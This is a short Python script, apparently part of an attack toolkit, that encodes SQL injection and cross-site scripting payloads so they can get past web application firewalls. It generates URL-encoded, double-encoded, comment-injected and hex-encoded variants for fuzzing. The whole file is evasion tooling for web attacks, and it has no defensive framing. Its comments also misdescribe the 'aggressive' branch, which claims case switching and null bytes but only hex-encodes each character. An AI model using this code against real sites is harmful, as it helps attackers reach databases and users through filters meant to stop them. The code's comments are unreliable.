import urllib.parse

def waf_encoder(payload, level="medium"):
    """
    Encodes payload to bypass WAF filters.
    Levels: basic, medium, aggressive
    """
    if level == "basic":
        # Simple URL Encoding
        return urllib.parse.quote(payload)
    
    elif level == "medium":
        # Double URL Encoding (Classic Bypass)
        # <script> -> %253Cscript%253E
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    elif level == "aggressive":
        # SQLi specific bypasses (Comment Injection)
        if "UNION" in payload or "SELECT" in payload:
            return payload.replace(" ", "/**/").replace("=", "/**/LIKE/**/")
        
        # XSS specific (Case switching & Null bytes)
        # <script> -> <ScRiPt%00>
        encoded = ""
        for char in payload:
            encoded += f"%{hex(ord(char))[2:]}"
        return encoded

    return payload

def generate_bypass_payloads(original_payload):
    """Generates a list of all variations for fuzzing"""
    variations = [
        original_payload,
        waf_encoder(original_payload, "basic"),
        waf_encoder(original_payload, "medium"),
        waf_encoder(original_payload, "aggressive")
    ]
    # Filter unique only
    return list(set(variations))